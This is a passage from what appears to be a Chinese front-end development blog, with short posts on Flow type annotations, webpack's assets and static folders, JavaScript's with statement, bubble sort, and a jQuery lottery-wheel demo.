<p>数组类型注释的格式是 Array<T>，T 表示数组中每项的数据类型。在上述代码中，arr 是每项均为数字的数组。如果我们给这个数组添加了一个字符串，Flow 能检查出错误。</p>
<blockquote>
<p>类和对象</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/*@flow*/</span><br><span class="line"></span><br><span class="line">class Bar &#123;</span><br><span class="line">  x: string;           // x 是字符串</span><br><span class="line">  y: string | number;  // y 可以是字符串或者数字</span><br><span class="line">  z: boolean;</span><br><span class="line"></span><br><span class="line">  constructor(x: string, y: string | number) &#123;</span><br><span class="line">    this.x = x</span><br><span class="line">    this.y = y</span><br><span class="line">    this.z = false</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var bar: Bar = new Bar(&#x27;hello&#x27;, 4)</span><br><span class="line"></span><br><span class="line">var obj: &#123; a: string, b: number, c: Array&lt;string&gt;, d: Bar &#125; = &#123;</span><br><span class="line">  a: &#x27;hello&#x27;,</span><br><span class="line">  b: 11,</span><br><span class="line">  c: [&#x27;hello&#x27;, &#x27;world&#x27;],</span><br><span class="line">  d: new Bar(&#x27;hello&#x27;, 3)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类的类型注释格式如上，可以对类自身的属性做类型检查，也可以对构造函数的参数做类型检查。这里需要注意的是，属性 y 的类型中间用 | 做间隔，表示 y 的类型即可以是字符串也可以是数字。<br>对象的注释类型类似于类，需要指定对象属性的类型。</p>
<blockquote>
<p>Null</p>
</blockquote>
<p>若想任意类型 T 可以为 null 或者 undefined，只需类似如下写成 ?T 的格式即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*@flow*/</span><br><span class="line"></span><br><span class="line">var foo: ?string = null</span><br></pre></td></tr></table></figure>

<p>此时，foo 可以为字符串，也可以为 null。<br>目前我们只列举了 Flow 的一些常见的类型注释。如果想了解所有类型注释，请移步 <a target="_blank" rel="noopener" href="https://flow.org/en/">Flow</a> 的官方文档。</p>
<h2 id="Flow-在-Vue-js-源码中的应用"><a href="#Flow-在-Vue-js-源码中的应用" class="headerlink" title="Flow 在 Vue.js 源码中的应用"></a>Flow 在 Vue.js 源码中的应用</h2><p>有时候我们想引用第三方库，或者自定义一些类型，但 Flow 并不认识，因此检查的时候会报错。为了解决这类问题，Flow 提出了一个 libdef 的概念，可以用来识别这些第三方库或者是自定义类型，而 Vue.js 也利用了这一特性。<br>在 <a target="_blank" rel="noopener" href="https://github.com/vuejs/vue">Vue.js</a> 的主目录下有 .flowconfig 文件， 它是 Flow 的配置文件，感兴趣的同学可以看官方文档。这其中的 [libs] 部分用来描述包含指定库定义的目录，默认是名为 flow-typed 的目录。<br>这里 [libs] 配置的是 flow，表示指定的库定义都在 flow 文件夹内。我们打开这个目录，会发现文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flow</span><br><span class="line">├── compiler.js        # 编译相关</span><br><span class="line">├── component.js       # 组件数据结构</span><br><span class="line">├── global-api.js      # Global API 结构</span><br><span class="line">├── modules.js         # 第三方库定义</span><br><span class="line">├── options.js         # 选项相关</span><br><span class="line">├── ssr.js             # 服务端渲染相关</span><br><span class="line">├── vnode.js           # 虚拟 node 相关</span><br></pre></td></tr></table></figure>

<p>可以看到，Vue.js 有很多自定义类型的定义，在阅读源码的时候，如果遇到某个类型并想了解它完整的数据结构的时候，可以回来翻阅这些数据结构的定义。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/06/27/flow/" data-id="ckw8thujq000we4d8hge41txp" data-title="Flow" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E4%BA%AB/" rel="tag">分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%BC%E8%88%AA/" rel="tag">导航</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-assets和static的区别" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/06/03/assets%E5%92%8Cstatic%E7%9A%84%E5%8C%BA%E5%88%AB/" class="article-date">
  <time class="dt-published" datetime="2019-06-03T02:31:45.000Z" itemprop="datePublished">2019-06-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/webpack/">webpack</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/06/03/assets%E5%92%8Cstatic%E7%9A%84%E5%8C%BA%E5%88%AB/">assets和static的区别</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="处理静态资产"><a href="#处理静态资产" class="headerlink" title="处理静态资产"></a>处理静态资产</h1><blockquote>
<p>在项目结构中您可能注意到我们有两个静态资产目录：src/assets和static/。可能有人会问，他们之间有什么区别？</p>
</blockquote>
<h2 id="Webpacked-Assets"><a href="#Webpacked-Assets" class="headerlink" title="Webpacked Assets"></a>Webpacked Assets</h2><p>为了回答这个问题，我们首先需要了解Webpack如何处理静态资产。在 *.vue 组件中，所有模板和CSS都会被 vue-html-loader 及 css-loader 解析，并查找资源URL。例如，在<br><code>&lt;img src=&quot;./logo.png&quot;&gt;</code><br>和<br><code>background: url(./logo.png)</code><br> 中，”./logo.png” 是相对的资源路径，将由Webpack解析为模块依赖。</p>
<p>因为 logo.png 不是 JavaScript，当被视为模块依赖时，需要使用 url-loader 和 file-loader<br>处理它。vue-cli 的 webpack 脚手架已经配置了这些 loader，因此可以使用相对/模块路径。</p>
<p>由于这些资源可能在构建过程中被内联/复制/重命名，所以它们基本上是源代码的一部分。这就是为什么建议将<br>Webpack 处理的静态资源放在 /src 目录中和其它源文件放一起的原因。事实上，甚至不必把它们全部放在 /src/assets：可以用模块/组件的组织方式来使用它们。例如，可以在每个放置组件的目录中存放静态资源。</p>
<h2 id="“Real”-Static-Assets"><a href="#“Real”-Static-Assets" class="headerlink" title="“Real” Static Assets"></a>“Real” Static Assets</h2><p>相比之下，static/ 目录下的文件并不会被 Webpack 处理：它们会直接被复制到最终目录（默认是dist/static）下。必须使用绝对路径引用这些文件，这是通过在 config.js 文件中的 build.assetsPublicPath 和 build.assetsSubDirectory 连接来确定的。</p>
<p>任何放在 static/ 中文件需要以绝对路径的形式引用：/static/[filename]。如果更改 assetSubDirectory 的值为 assets，那么路径需改为 /assets/[filename]。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>assets里面的会被webpack打包进你的代码里，而static里面的，就直接引用了。一般在static里面放一些类库的文件，在assets里面放属于该项目的资源文件。</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/06/03/assets%E5%92%8Cstatic%E7%9A%84%E5%8C%BA%E5%88%AB/" data-id="ckw8thujn000pe4d87eo2d7v8" data-title="assets和static的区别" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E4%BA%AB/" rel="tag">分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%BC%E8%88%AA/" rel="tag">导航</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-with语句" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/05/24/with%E8%AF%AD%E5%8F%A5/" class="article-date">
  <time class="dt-published" datetime="2019-05-24T09:06:45.000Z" itemprop="datePublished">2019-05-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/javascript/">javascript</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/05/24/with%E8%AF%AD%E5%8F%A5/">with语句</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="with语句"><a href="#with语句" class="headerlink" title="with语句"></a>with语句</h1><ul>
<li>作用: 将代码的作用域设置到一个特定的对象中</li>
<li>语法：with(expression) statement;</li>
</ul>
<h2 id="使用with语句的目的主要是简化多次编写同一个对象的工作，"><a href="#使用with语句的目的主要是简化多次编写同一个对象的工作，" class="headerlink" title="使用with语句的目的主要是简化多次编写同一个对象的工作，"></a>使用with语句的目的主要是简化多次编写同一个对象的工作，</h2><p><strong>例如</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var qs = location.search.substring(1);</span><br><span class="line">var hostname = location.hostname;</span><br><span class="line">var url = location.href;</span><br></pre></td></tr></table></figure>

<p>上面代码都包含location对象。如果使用with语句可以改写如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">with(location)&#123;</span><br><span class="line">    var qs = search.substring(1);</span><br><span class="line">    var hostname = hostname;</span><br><span class="line">    var url = href;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个重写的例子中，使用with语句关联了location对象，意味着在with语句的代码快内部。每个变量首先会被认为是一个局部变量，而如果在局部环境中找不到该变量的定义，就会查找location对象中是否有同名的属性。如果发现了同名属性，则以location对象属性的值作为变量的值。</p>
<blockquote>
<p>严格模式下不允许使用with语句，否则将视为语法错误</p>
</blockquote>
<h2 id="由于大量使用with语句会导致性能下降，同时也会给代码调试造成困难，因为在开发大型应用程序中，不建议使用with语句。"><a href="#由于大量使用with语句会导致性能下降，同时也会给代码调试造成困难，因为在开发大型应用程序中，不建议使用with语句。" class="headerlink" title="由于大量使用with语句会导致性能下降，同时也会给代码调试造成困难，因为在开发大型应用程序中，不建议使用with语句。"></a>由于大量使用with语句会导致性能下降，同时也会给代码调试造成困难，因为在开发大型应用程序中，不建议使用with语句。</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/05/24/with%E8%AF%AD%E5%8F%A5/" data-id="ckw8thuk7001ve4d866d81c26" data-title="with语句" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E4%BA%AB/" rel="tag">分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%BC%E8%88%AA/" rel="tag">导航</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-冒泡排序" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/05/22/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/" class="article-date">
  <time class="dt-published" datetime="2019-05-22T03:06:45.000Z" itemprop="datePublished">2019-05-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/algorithm/">algorithm</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/05/22/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/">冒泡排序</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--目标数组--&gt;</span><br><span class="line">var array = [1,3,4,7,8,5,22,11,15,35,9] ;</span><br><span class="line"></span><br><span class="line">&lt;!--方法一--&gt;</span><br><span class="line">function bubbleSort1(array)&#123;</span><br><span class="line">	var temp ;</span><br><span class="line">	for (var i = 0; i &lt; array.length; i++)&#123;</span><br><span class="line">		for (var j = 0; j &lt; array.length - 1; j++)&#123;</span><br><span class="line">			if (array[j] &gt; array[j + 1])&#123;</span><br><span class="line">			    &lt;!--先把j+1位置的值(小的)赋给中间值保存--&gt;</span><br><span class="line">				temp = array[j + 1]; </span><br><span class="line">				&lt;!--然后把j位置的值(大的)赋给j+1,位置不变，但是要重新赋值--&gt;</span><br><span class="line">				array[j + 1] = array[j];</span><br><span class="line">				&lt;!--然后把临时保存的小值赋给前面位置的j--&gt;</span><br><span class="line">				array[j] = temp; </span><br><span class="line">			&#125; </span><br><span class="line">		&#125; 					</span><br><span class="line">	&#125;</span><br><span class="line">	return array ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--方法二--&gt;</span><br><span class="line">function bubbleSort2(array)&#123;</span><br><span class="line">    var temp ;</span><br><span class="line">    var i = array.length - 1 ;</span><br><span class="line">    var j ;</span><br><span class="line">    while (i &gt; 0) &#123;</span><br><span class="line">	    for(j = 0 ; j &lt;= i ; j ++) &#123;</span><br><span class="line">		    if(array[j] - array[j + 1] &gt; 0)&#123;</span><br><span class="line">			    temp = array [j] ;</span><br><span class="line">			    array[j] = array [j + 1];</span><br><span class="line">			    array[j + 1] = temp ;</span><br><span class="line">		    &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	    i-- ;</span><br><span class="line">    &#125;</span><br><span class="line">    return array ;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/05/22/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/" data-id="ckw8thukf0027e4d8czxf1cw3" data-title="冒泡排序" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E4%BA%AB/" rel="tag">分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%BC%E8%88%AA/" rel="tag">导航</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-jQuery实现的轮盘抽奖" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/05/21/jQuery%E5%AE%9E%E7%8E%B0%E7%9A%84%E8%BD%AE%E7%9B%98%E6%8A%BD%E5%A5%96/" class="article-date">
  <time class="dt-published" datetime="2019-05-21T12:24:22.000Z" itemprop="datePublished">2019-05-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/funny/">funny</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/05/21/jQuery%E5%AE%9E%E7%8E%B0%E7%9A%84%E8%BD%AE%E7%9B%98%E6%8A%BD%E5%A5%96/">jQuery实现的轮盘抽奖</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="微信公众号的大转盘抽奖效果"><a href="#微信公众号的大转盘抽奖效果" class="headerlink" title="微信公众号的大转盘抽奖效果"></a>微信公众号的大转盘抽奖效果</h1><blockquote>
<p>用到的资源可以去我的githup<a target="_blank" rel="noopener" href="https://github.com/heartwarming/pluginLibrary">下载</a></p>
</blockquote>
<p><strong>实现后的效果如下图</strong></p>
<p><img src="/images/funny_01.png"></p>
<h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;抽奖&lt;/title&gt;</span><br><span class="line">&lt;link href=&quot;style/index.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</span><br><span class="line">&lt;script src=&quot;js/index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;lotteryBox&quot;&gt;</span><br><span class="line">	&lt;div class=&quot;plateBox&quot;&gt;&lt;/div&gt;</span><br><span class="line">	&lt;div class=&quot;handBox&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="css"><a href="#css" class="headerlink" title="css"></a>css</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@charset &quot;utf-8&quot;;</span><br><span class="line">/* CSS Document */</span><br><span class="line">.lotteryBox&#123; </span><br><span class="line">    position:relative;</span><br><span class="line">&#125;</span><br><span class="line">.plateBox&#123; </span><br><span class="line">    width:500px; </span><br><span class="line">    height:500px; </span><br><span class="line">    background:url(../img/plate.png) no-repeat;</span><br><span class="line">&#125;</span><br><span class="line">.handBox&#123; </span><br><span class="line">    width:500px; </span><br><span class="line">    height:500px; </span><br><span class="line">    background:url(../img/hand.png) no-repeat; </span><br><span class="line">    position:absolute; </span><br><span class="line">    top:0px; </span><br><span class="line">    left:0px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">每天抽奖次数限制</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line">var haveprize=0;</span><br><span class="line">$(function()&#123;</span><br><span class="line">	$(&quot;.plateBox&quot;).css(&quot;transform-origin&quot;,&quot;50% 50%&quot;);</span><br><span class="line">	$(&quot;.plateBox&quot;).css(&quot;transform&quot;,&quot;rotate(0deg)&quot;);</span><br><span class="line">	//添加抽奖事件</span><br><span class="line">	addevent();</span><br><span class="line">	</span><br><span class="line">&#125;)</span><br><span class="line">/*开始抽奖函数，参数为中奖编号*/</span><br><span class="line">function plateBoxPlay(code)&#123;</span><br><span class="line">	deleteevent();//暂时删除抽奖事件</span><br><span class="line">	//设置角度间隔</span><br><span class="line">	var $plateBox=$(&quot;.plateBox&quot;);</span><br><span class="line">	var angle=360/8;</span><br><span class="line">	var thiscode=code-1;</span><br><span class="line">	//生成随机圈数</span><br><span class="line">	var number_turns=Math.ceil(Math.random()*5);</span><br><span class="line">	//获取修正角度</span><br><span class="line">	var thisspare=getdeg($plateBox)%360;</span><br><span class="line">	//计算旋转角度</span><br><span class="line">	var this_turns=parseInt(number_turns*360-thiscode*angle-thisspare);</span><br><span class="line">	//调用动画</span><br><span class="line">	play_animate($plateBox,this_turns,code);</span><br><span class="line">&#125;</span><br><span class="line">//获取当前转盘角度</span><br><span class="line">function getdeg($box)&#123;</span><br><span class="line">	var style=$box[0].style.transform;</span><br><span class="line">	console.log(style);</span><br><span class="line">	//角度取值</span><br><span class="line">	var thisdeg=parseInt(style.match(/rotate\(([^)]+)\)/)[1]);</span><br><span class="line">	return thisdeg;</span><br><span class="line">&#125;</span><br><span class="line">//抽奖动画</span><br><span class="line">function play_animate($box,turns,code)&#123;</span><br><span class="line">	//动画初始化</span><br><span class="line">	var thisdeg=getdeg($box);</span><br><span class="line">	var targetturns=thisdeg+turns;</span><br><span class="line">	</span><br><span class="line">	var timer=setInterval(function()&#123;</span><br><span class="line">			var thisdeg=getdeg($box);</span><br><span class="line">			//设置速度</span><br><span class="line">			var speed=Math.ceil((targetturns-thisdeg)/10);</span><br><span class="line">			//本次旋转角度</span><br><span class="line">			var playdeg=thisdeg+speed;</span><br><span class="line">			//设置角度</span><br><span class="line">			$box.css(&quot;transform&quot;,&quot;rotate(&quot;+playdeg+&quot;deg)&quot;);</span><br><span class="line">			//console.log(playdeg);</span><br><span class="line">			//判定结束</span><br><span class="line">			if(thisdeg&gt;=targetturns)&#123;</span><br><span class="line">				clearInterval(timer);</span><br><span class="line">				alert(&quot;您抽中了&quot;+code+&quot;等奖！&quot;);</span><br><span class="line">				addevent();//重新添加抽奖事件</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,100);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//添加事件</span><br><span class="line">function addevent()&#123;</span><br><span class="line">	$(&quot;.handBox&quot;).on(&quot;click&quot;,function()&#123;</span><br><span class="line">		//设置抽奖次数，0为不限次</span><br><span class="line">		var runnumber=0;</span><br><span class="line">		if(runNumb(runnumber))&#123;</span><br><span class="line">			//执行抽奖函数</span><br><span class="line">			plateBoxPlay(prize());</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			alert(&quot;对不起！您今天已经抽了&quot;+runnumber+&quot;次了，请明天再试！&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line">//删除事件</span><br><span class="line">function deleteevent()&#123;</span><br><span class="line">	$(&quot;.handBox&quot;).off(&quot;click&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//每天限制次数函数，参数为限制的次数</span><br><span class="line">function runNumb(nmb)&#123;</span><br><span class="line">	//获取日期</span><br><span class="line">	var thisdate=getdate();</span><br><span class="line">	//返回值</span><br><span class="line">	var code=true;</span><br><span class="line">	//抽奖记录</span><br><span class="line">	var thisRuncode=&#123;date:thisdate,runcode:0&#125;</span><br><span class="line">	//判断是否有本地数据</span><br><span class="line">	if(window.localStorage[&quot;runcode&quot;])&#123;</span><br><span class="line">		//数据转换</span><br><span class="line">		var Runcode=JSON.parse(window.localStorage[&quot;runcode&quot;]);</span><br><span class="line">		//判断是否当天</span><br><span class="line">		if(Runcode.date==thisdate)&#123;</span><br><span class="line">			if(nmb==0)&#123;</span><br><span class="line">			&#125;else if(Runcode.runcode&gt;=nmb)&#123;</span><br><span class="line">				code=false;</span><br><span class="line">			&#125;else&#123;</span><br><span class="line">				thisRuncode=&#123;date:thisdate,runcode:Runcode.runcode+1&#125;;</span><br><span class="line">				addlocalStorage(thisRuncode);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			addlocalStorage(thisRuncode);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		</span><br><span class="line">		addlocalStorage(thisRuncode);</span><br><span class="line">	&#125;</span><br><span class="line">	return code;</span><br><span class="line">&#125;</span><br><span class="line">//本地存储函数</span><br><span class="line">function addlocalStorage(thisRuncode)&#123;</span><br><span class="line">	window.localStorage[&quot;runcode&quot;]=JSON.stringify(thisRuncode);</span><br><span class="line">&#125;</span><br><span class="line">//获取日期函数</span><br><span class="line">function getdate()&#123;</span><br><span class="line">	var thisdate=new Date();</span><br><span class="line">	var thisdy=thisdate.getYear()+thisdate.getMonth()+1+thisdate.getDate();</span><br><span class="line">	return thisdy;</span><br><span class="line">&#125;</span><br><span class="line">//随机抽奖刷新一次页面只能抽一次1等奖,返回值为奖项序号</span><br><span class="line">function prize()&#123;</span><br><span class="line">	var thisprize=Math.ceil(Math.random()*8);</span><br><span class="line">	if(thisprize==1)&#123;</span><br><span class="line">		if(haveprize==thisprize)&#123;</span><br><span class="line">			prize();</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			haveprize=thisprize;</span><br><span class="line">			return thisprize;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		return thisprize;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h1><blockquote>
<p>如有问题欢迎留言，会及时回复</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/05/21/jQuery%E5%AE%9E%E7%8E%B0%E7%9A%84%E8%BD%AE%E7%9B%98%E6%8A%BD%E5%A5%96/" data-id="ckw8thujx0017e4d8cm2t48hv" data-title="jQuery实现的轮盘抽奖" class="article-share-link">Share</a>
      
      
      
